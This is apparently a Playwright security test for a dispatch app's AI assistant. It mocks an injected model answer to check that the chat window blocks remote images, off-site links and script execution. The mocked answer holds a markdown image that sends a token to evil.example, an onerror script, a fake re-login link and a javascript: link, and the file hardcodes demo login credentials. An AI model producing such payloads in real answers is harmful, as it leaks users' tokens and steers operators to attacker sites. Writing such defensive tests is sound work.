import { expect, test } from "@playwright/test";

const API = process.env.PLAYWRIGHT_API_BASE_URL || "http://127.0.0.1:8001/api";

async function signIn(page) {
  await page.goto("/");
  const response = await page.request.post(`${API}/auth/login`, {
    data: { username: "dispatcher", password: "dispatcher-demo-pass" },
  });
  expect(response.ok()).toBeTruthy();
  const principal = await response.json();
  await page.evaluate((token) => {
    localStorage.setItem("pythia_auth", "true");
    localStorage.setItem("pythia_lang", "id");
    localStorage.setItem("pythia_token", token.token);
    localStorage.setItem("pythia_role", token.role);
  }, principal);
  await page.goto("/app/reports", { waitUntil: "domcontentloaded" });
  await expect(page.getByTestId("ask-ana")).toBeVisible();
}

// Security review: model output steered by injected text (a permit name, an uploaded file)
// must not load remote images or send the operator to another site, and the answer shows
// neither the model host nor a copy button.
test("an injected answer renders without remote images or off-site links", async ({ page }) => {
  await signIn(page);
  const requested = [];
  page.on("request", (request) => {
    if (request.url().includes("evil.example")) requested.push(request.url());
  });
  await page.route("**/api/assistant/query", (route) =>
    route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        provider: "openai",
        mode: "llm",
        provider_name: "127.0.0.1",
        model: "test-model",
        answer:
          "Ringkasan siap. ![x](https://evil.example/pixel?d=token) " +
          '<img src="https://evil.example/b.png" onerror="window.__pwned=1"> ' +
          "[Masuk ulang](https://evil.example/login) · [Laporan](/app/reports) · [js](javascript:alert(1))",
        tools_used: [],
      }),
    }),
  );
  await page.getByTestId("ask-ana").click();
  const dialog = page.getByRole("dialog", { name: "Ana" });
  await dialog.getByRole("textbox", { name: "Tanya apa saja ke Ana" }).fill("Ringkas hari ini");
  await dialog.getByRole("button", { name: "Kirim pesan" }).click();
  const answer = dialog.getByTestId("assistant-message").last();
  await expect(answer).toContainText("Ringkasan siap.");

  await expect(answer.locator("img")).toHaveCount(0);
  const hrefs = await answer
    .locator("a[href]")
    .evaluateAll((links) => links.map((a) => a.getAttribute("href")));
  expect(hrefs).toEqual(["/app/reports"]);
  await expect(answer.locator("a[target]")).toHaveCount(0);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(requested).toEqual([]);

  await expect(answer).not.toContainText("127.0.0.1");
  await expect(answer.getByRole("button", { name: /salin|copy/i })).toHaveCount(0);
});
